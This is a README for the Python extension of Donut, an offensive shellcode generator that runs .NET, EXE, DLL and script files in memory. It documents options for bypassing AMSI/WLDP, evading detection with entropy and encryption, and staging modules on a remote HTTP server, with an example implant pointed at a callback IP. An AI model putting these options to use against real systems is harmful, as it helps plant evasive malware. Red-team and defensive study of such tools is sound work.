# Python Extension

A Python C extension is now available which allows you to dynamically generate donut shellcode in Python.

## Requirements

The extension has only been tested in Python 3.7, it shouldn't have any compatibility issues with older 3.X versions of Python.

It will ***not*** work in Python 2.x.

## Installing the Extension

(Once the extension has been published to PyPi)
```
pip3 install donut-shellcode
```

## Manually Compiling And Installing the Extension

```bash
git clone https://github.com/TheWover/donut && cd donut
pip3 install . # or python setup.py install
```

## Usage

The Python extension accepts the same parameters as the main donut executable.

Here's a minimalistic example of using the extension:

```python
import donut
shellcode = donut.create(file="naga.exe", params='https://172.16.164.1/')
```

The ```donut``` module exposes only one function ```create()```, which is used to generate shellcode and accepts both positional and keyword arguments.

The only required parameter the ```create()``` function needs is the ```file``` argument which accepts a path to the .NET EXE/DLL or VBS/JS file to turn into shellcode.

```python
import donut

shellcode = donut.create(
    file='naga.exe',         # .NET assembly, EXE, DLL, VBS, JS or XSL file to execute in-memory
    url='http://127.0.0.1',  # HTTP server that will host the donut module
    arch=1,                  # Target architecture : 1=x86, 2=amd64, 3=x86+amd64(default)
    bypass=3,                # Bypass AMSI/WLDP : 1=none, 2=abort on fail, 3=continue on fail.(default)
    cls='namespace.class',   # Optional class name.  (required for .NET DLL)
    method='method',         # Optional method or API name for DLL. (method is required for .NET DLL)
    params='arg1 arg2',      # Optional parameters or command line.
    runtime='version',       # CLR runtime version. MetaHeader used by default or v4.0.30319 if none available
    appdomain='name'         # AppDomain name to create for .NET. Randomly generated by default.
)
```

## Keywords

The following table lists key words for the create method.

<table>
  <tr>
    <th>Keyword</th>
    <th>Type</th>
    <th>Description</th>
  </tr>
  <tr>
    <td>file</td>
    <td>String</td>
    <td>The path of file to execute in memory. VBS/JS/EXE/DLL files are supported.</td>
  </tr>
  <tr>
    <td>arch</td>
    <td>Integer</td>
    <td>Indicates the type of assembly code to generate. 1=<code>DONUT_ARCH_X86</code> and 2=<code>DONUT_ARCH_X64</code> are self-explanatory. 3=<code>DONUT_ARCH_X84</code> indicates dual-mode that combines shellcode for both X86 and AMD64. ARM64 will be supported at some point.</td>
  </tr>
  <tr>
    <td>bypass</td>
    <td>Integer</td>
    <td>Specifies behaviour of the code responsible for bypassing AMSI and WLDP. The current options are 1=<code>DONUT_BYPASS_NONE</code> which indicates that no attempt be made to disable AMSI or WLDP. 2=<code>DONUT_BYPASS_ABORT</code> indicates that failure to disable should result in aborting execution of the module. 3=<code>DONUT_BYPASS_CONTINUE</code> indicates that even if AMSI/WDLP bypasses fail, the shellcode will continue with execution.</td>
  </tr>
  <tr>
    <td>compress</td>
    <td>Integer</td>
    <td>Indicates if the input file should be compressed. Available engines are 1=<code>DONUT_COMPRESS_NONE</code>, 2=<code>DONUT_COMPRESS_APLIB</code> to use the <a href="http://ibsensoftware.com/products_aPLib.html">aPLib</a> algorithm. For builds on Windows, the <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtlcompressbuffer">RtlCompressBuffer</a> API is available and supports 3=<code>DONUT_COMPRESS_LZNT1</code>, 4=<code>DONUT_COMPRESS_XPRESS</code> and 5=<code>DONUT_COMPRESS_XPRESS_HUFF</code>.</td>
  </tr>
  <tr>
    <td>entropy</td>
    <td>Integer</td>
    <td>Indicates whether Donut should use entropy and/or encryption for the loader to help evade detection. Available options are 1=<code>DONUT_ENTROPY_NONE</code>, 2=<code>DONUT_ENTROPY_RANDOM</code>, which generates random strings and 3=<code>DONUT_ENTROPY_DEFAULT</code> that combines <code>DONUT_ENTROPY_RANDOM</code> with symmetric encryption.</td>
  </tr>
  <tr>
    <td>format</td>
    <td>Integer</td>
    <td>Specifies the output format for the shellcode loader. Supported formats are 1=<code>DONUT_FORMAT_BINARY</code>, 2=<code>DONUT_FORMAT_BASE64</code>, 3=<code>DONUT_FORMAT_RUBY</code>, 4=<code>DONUT_FORMAT_C</code>, 5=<code>DONUT_FORMAT_PYTHON</code>, 6=<code>DONUT_FORMAT_POWERSHELL</code>, 7=<code>DONUT_FORMAT_CSHARP</code> and 8=<code>DONUT_FORMAT_HEX</code>. On Windows, the base64 string is copied to the clipboard.</td>
  </tr>
  <tr>
    <td>exit_opt</td>
    <td>Integer</td>
    <td>When the shellcode ends, <code>RtlExitUserThread</code> is called, which is the default behaviour. Use 2=<code>DONUT_OPT_EXIT_PROCESS</code> to terminate the host process via the <code>RtlExitUserProcess</code> API. Use 3=<code>DONUT_OPT_EXIT_BLOCK</code> to not exit or cleanup and instead block indefinitely.</td>
  </tr>
  <tr>
    <td>thread</td>
    <td>Integer</td>
    <td>If the file is an unmanaged EXE, the loader will run the entrypoint as a thread. The loader also attempts to intercept calls to exit-related API stored in the Import Address Table by replacing those pointers with the address of the <code>RtlExitUserThread</code> API. However, hooking via IAT is generally unreliable and Donut may use code splicing / hooking in the future.</td>
  </tr>
  <tr>
    <td>oep</td>
    <td>String</td>
    <td>Tells the loader to create a new thread before continuing execution at the OEP provided by the user. Address should be in hexadecimal format.</td>
  </tr>
  <tr>
    <td>output</td>
    <td>String</td>
    <td>The path of where to save the shellcode/loader. Default is "loader.bin".</td>
  </tr>
  <tr>
    <td>runtime</td>
    <td>String</td>
    <td>The CLR runtime version to use for a .NET assembly. If none is provided, Donut will try reading from the PE's COM directory. If that fails, v4.0.30319 is used by default.</td>
  </tr>
  <tr>
    <td>appdomain</td>
    <td>String</td>
    <td>AppDomain name to create. If one is not specified by the caller, it will be generated randomly. If entropy is disabled, it will be set to "AAAAAAAA"</td>
  </tr>
  <tr>
    <td>cls</td>
    <td>String</td>
    <td>The class name with method to invoke. A namespace is optional. e.g: <var>namespace.class</td>
  </tr>
  <tr>
    <td>method</td>
    <td>String</td>
    <td>The method that will be invoked by the shellcode once a .NET assembly is loaded into memory. This also holds the name of an exported API if the module is an unmanaged DLL.</td>
  </tr>
  <tr>
    <td>params</td>
    <td>String</td>
    <td>List of parameters for the .NET method or DLL function. For unmanaged EXE files, a 4-byte string is generated randomly to act as the module name. If entropy is disabled, this will be "AAAA"</td>
  </tr>
  <tr>
    <td>unicode</td>
    <td>Integer</td>
    <td>By default, the <code>params</code> string is passed to an unmanaged DLL function as-is, in ANSI format. If set, param is converted to UNICODE.</td>
  </tr>
  <tr>
    <td>url or server</td>
    <td>String</td>
    <td>If the instance type is <code>DONUT_INSTANCE_HTTP</code>, this should contain the server and path of where module will be stored. e.g: https://www.staging-server.com/modules/</td>
  </tr>
  <tr>
    <td>modname</td>
    <td>String</td>
    <td>If the type is <code>DONUT_INSTANCE_HTTP</code>, this will contain the name of the module for where to save the contents of <code>mod</code> to disk. If none is provided by the user, it will be generated randomly. If entropy is disabled, it will be set to "AAAAAAAA"</td>
  </tr>
</table>

## Author

The Python extension was written by [@byt3bl33d3r](https://twitter.com/byt3bl33d3r)
